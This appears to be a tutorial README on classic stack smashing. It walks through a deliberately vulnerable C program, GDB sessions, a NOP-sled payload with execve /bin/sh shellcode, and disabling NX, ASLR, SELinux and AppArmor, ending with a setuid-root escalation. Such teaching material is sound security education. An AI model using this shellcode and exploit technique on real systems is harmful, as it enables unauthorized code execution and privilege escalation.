### Smashing the stack the old way ###

#### Motivation ####

While stack smashing is an old technique to be shown in museums due to recent available broad mitigations it holds relevance still to this day beacuse it's implications that lies in the design of computers itself.\
Learn the concepts and transmit them in an inteligible manner to asure full comprehension of the topic.\
To apply the later explored concepts as simple as possible to comprehend the consecuences of unintended and undefined behavior that arises a vulnerability such as stack smashing.\
To amuse my friends and have fun.

First of all lets introduce to the memory of the system:

![](https://github.com/daedalus/stack_smashing/raw/master/program_in_memory2.png)

While the stack grows downward the heap grows upward.\
Our program code will be loaded in the text region.\
Our automatic variables will be placed in the stack region with function call parameters.\
Our dynamic memory will be loeaded into the heap, that is for mallocs, etc.\
We are going to be fousing only on stack vulnerabilites.

#### We will need some dependencies: ####
```
sudo apt-get install gcc gdb
```

We asume that we have _python2.7_ as command python installed beacuse we are going to use _"\xHH"_ for escaping bytes and python3 doesnt handle them very well. Blame _utf8_ by default in this thing _"\xHH"_ in python3.\
We asume the target system fo the reader is a _linux box x86_64_, in other sistems should follow throught this readme with some minor modifications by the reader

#### Lets begin with a innocent program ####
```
#include<stdio.h>
#include<string.h>

int main(int argc, char** argv) {
    char buffer[500];
    strcpy(buffer, argv[1]);
    return 0;
}
```
What our innocent program does is: it initializes a static variable of type char of size 500 and then tries to copy a string from command line. Nothing fancy.

#### Lets compile it: ####
```
gcc vuln.c -o vuln
```

#### Attempting execution with a simple string such as 'hello' returns no errors: ####
```
$ ./vuln hello
```

#### Now if we send more than what we defined in our buffer: ####
```
$ ./vuln $(python -c 'print "\x41" * 524 ')
Segmentation fault
```

This means that we overrun the buffer.

#### Lets retry this in the GDB debuger: ####

```
$ gdb vuln
(gdb) run $(python -c 'print "\x41" * 524 ')
Program received signal SIGSEGV, Segmentation fault.
0x00007f0041414141 in ?? ()
```

#### Now lets check the registers: ####

```
(gdb) info reg
rsp            0x7fffffffdfe0	0x7fffffffdfe0
rip            0x7f0041414141   0x7f0041414141
```
This means that now we control what the _RIP_ register or (return instruction pointer) point to.\
This is our powerfull weapon because if we can control the _RIP_ register we can point it to our malicious code.

The register _RSP_ point to the top of the current stack frame.\
We will need to remember this value for later.

#### _Lets Introduce the nop-sled:_ ####

The _NOP_ instruction tells the CPU to do nothing and move to the next instruction.\
The _NOP-sled_ is like: picture Boba Fet falling into the Sarlacc pit.\
Anywhere we land into the middle of a _NOP-sled_ we end up in the same place.\
And in the end of the _NOP-sled_ we are going to put our shellcode.\
Then our main idea is to put a big enought _NOP-sled_ that takes almost all the buffer up to almost the address where _RIP_ is.

#### Again we run our innocent program with a bunch of _NOPs_: ####
```
(gdb) run $(python -c 'print "\x90" * 524 ')
Program received signal SIGSEGV, Segmentation fault.
0x00007f0090909090 in ?? ()
```
The same happens but the rip address now points to **0x00007f0090909090**.

We need to add to the end of the _NOP-sled_ our _shellcode:_ **"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"**

This is a generic 22 bytes _linux-x86_64 execve /bin/sh shellcode:_

Its asm code is:
```
   0:   48 31 f6                xor    %rsi,%rsi
   3:   56                      push   %rsi
   4:   48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
   b:   2f 73 68 
   e:   57                      push   %rdi
   f:   54                      push   %rsp
  10:   5f                      pop    %rdi
  11:   b0 3b                   mov    $0x3b,%al
  13:   99                      cltd   
  14:   0f 05                   syscall 
  16:   0a                      .byte 0x
```

#### Appending it and executing our exploit again: ####
```
(gdb) run $(python -c 'print "\x90" * 524 + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
Program received signal SIGSEGV, Segmentation fault.
0x0000555555555173 in main ()
```
As we can see the resulting address **0x0000555555555173** is not even in the stack range
we can check this with:

```
(gdb) info proc mappings
Mapped address spaces:

          Start Addr           End Addr       Size     Offset objfile
      0x555555555000     0x555555556000     0x1000     0x1000 /home/dclavijo/stack_smashing/vuln
      0x7ffff7f87000     0x7ffff7f8a000     0x3000   0x1bb000 /lib/x86_64-linux-gnu/libc-2.30.so
      0x7ffff7fce000     0x7ffff7fd2000     0x4000        0x0 [vvar]
      0x7ffff7fd2000     0x7ffff7fd4000     0x2000        0x0 [vdso]
      0x7ffff7fd4000     0x7ffff7fd5000     0x1000        0x0 /lib/x86_64-linux-gnu/ld-2.30.so
      .
      .
      .
      0x7ffff7ffd000     0x7ffff7ffe000     0x1000    0x28000 /lib/x86_64-linux-gnu/ld-2.30.so
      0x7ffffffde000     0x7ffffffff000    0x21000        0x0 [stack]
```
Our stack is in the region of **0x7ffffffde000-0x7ffffffff000**.\
This means that our _NÖP-sled_ will need to cover all this region and our _RIP_ address will need to point to some place in this region.\
Lets say: **0x7fffffffdead** this value is arbitrary and has to be in range of the register _RSP_, in our case was **0x7fffffffdfe0**.\
We are expecting that **0x7fffffffdead** will be the middle of our _NOP-sled_.
This can vary from system to system distributions and kernels.\
In other cases we need to adjust only the last byte of the address like: _(RSP - **our_choosen_value**) < 518_.
Sometimes our stack can be in other ranges like **0x7ffffffde000-0x7ffffffff000**, in this other example the _NOP-sled_ will be at:
```
(gdb) x/10x $rsp-100
0x7fffffffdbcc:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffdbdc:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffdbec:	0x90909090	0x90909090
```
Thats why wee need to remember _RSP_ and adjust the landing value of _RIP_ to be in the middle of the _NOP-sled_
We also need to substract the payload from the _NOP-sled_, the payload is 23 bytes so 524-23.

#### Lets hit it again: ####
```
(gdb) run $(python -c 'print "\x90" * (524-23) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05"  ')
Program received signal SIGSEGV, Segmentation fault.
0x00007fff00050f99 in ?? ()
```
We are getting close:

For last we need to add our rip address that is going to be overwriten:\
witch is **0x7fffffffdead** and in the _x86_64_ machine endianess:\
We are going to add it more than one time because we are overwriting registers in ram so we dont know where exactly they are we only know that we need to be aligned in order for it to work. And we need to substract it from our _NOP-sled_ to not overshoot.

#### Lets try: ####
```
(gdb) run $(python -c 'print "\x90" * (524-23-30) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Program received signal SIGSEGV, Segmentation fault.
0xffffffdead050f99 in ?? ()
```

#### We got very close: ####

**0xffffffdead050f99** is not the address we wanted to land **0x7fffffffdead**\
**0x7fffffffdead** is our return address in the middle of the _NOP-sled_ when we overflow the _RIP_ register wil point to this address and then the exploit begins.

We need to align our exploit to the machine registers in ram.\
A +2 will suffice (this also can vary from system to system somethimes can be +3 or +1)

```
(gdb) run $(python -c 'print "\x90" * (524-23-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
```

Voila, we landed into the mouth of the Sarlacc, but why didn't our exploit worked at all?

```
(gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffdead in ?? ()
```

But why didn't our exploit worked at all?

#### Lets inspect our _RIP_: ####

```
0x00007fffffffdead in ?? ()
(gdb) x/10x 0x00007fffffffdead
0x7fffffffdead: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffdebd: 0x90909090  0x90909090  0x90909090  0x90909090
0x7fffffffdecd: 0x90909090  0x90909090
```

We can see that effectively we landed in the middle of our _NOP-sled_ but nothing happened.\
This is beacuse newer versions of gcc and linux by default set the execution bit of the stack page to disabled (_NX bit_).\
So we need to recompile again our inocent code disabling the stack execution protection.

```
gcc -z execstack  -g -fno-inline -fno-stack-protector -fno-pie -O0  vuln.c -o vuln
```

#### Lets hit it one more time: ####
```
gdb vuln
(gdb) run $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
$
```
Holy shiet, we have our first shell executed from a an expoit!!!

#### Lets try one more thing, lets execute it outside gdb: ####

```
./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
Segmentation fault
```
WTF? why it didn't work?\
Newer versions of linux include _Address space layout randomization_ or _ASLR_ for short.\
_ASLR_ is a technique of address randomization witch rearranges the internal mappings of the sections of a process memory.\
Our exploit didn't work beacuse we are asumming our program stack is going to be in the fixed range **0x7ffffffde000-0x7ffffffff000** and _ASLR_ efectively prevents it to work beacuse in linux is enabled by defaut.\

But we can disable it momentarily:
```
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
Also we may need to disable selinux and apparmor in order for this exploit to work:
```
sudo setenforce 0
sudo systemctl stop apparmor
```

#### And for last time: ####
```
./vuln $(python -c 'print "\x90" * (524-22-30+2) + "\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05" + "\x7f\xff\xff\xff\xde\xad"[::-1] * 5  ')
$
```

We got our exploit working.

#### Extra bits ####

If we set the bit of suid and change the owner of the binary to root.
```
chmod +s vuln
chown root:root vuln
```
We may attain root.

References

* https://en.wikipedia.org/wiki/NOP_slide
* https://en.wikipedia.org/wiki/Address_space_layout_randomization
* http://phrack.org/issues/49/14.html
* https://www.youtube.com/watch?v=1S0aBV-Waeo
